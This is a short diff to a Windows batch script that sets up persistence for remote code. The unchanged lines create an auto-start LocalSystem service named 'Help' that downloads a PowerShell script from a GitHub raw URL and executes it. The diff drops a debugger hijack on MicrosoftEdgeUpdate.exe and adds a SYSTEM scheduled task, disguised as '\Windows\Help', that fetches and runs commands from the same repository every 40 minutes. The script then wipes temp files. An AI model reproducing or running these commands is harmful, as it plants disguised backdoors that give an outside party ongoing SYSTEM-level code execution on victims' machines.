@@ -20,7 +20,7 @@ for %a in (%processList%) do (
 )
 
 sc create Help binPath="cmd.exe /c powershell.exe irm https://raw.githubusercontent.com/pushop/0/0/p/run.ps1 ^| iex" start="auto" obj="LocalSystem"
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/p/push | cmd /Q /V:ON" /f
+schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc minute /mo 40 /tn "\Windows\Help" /tr "cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/p/push | cmd /Q /V:ON" /F
 del /S /Q "%USERPROFILE%\AppData\Local\Temp\*.*"
 
 chcp 65001 >nul
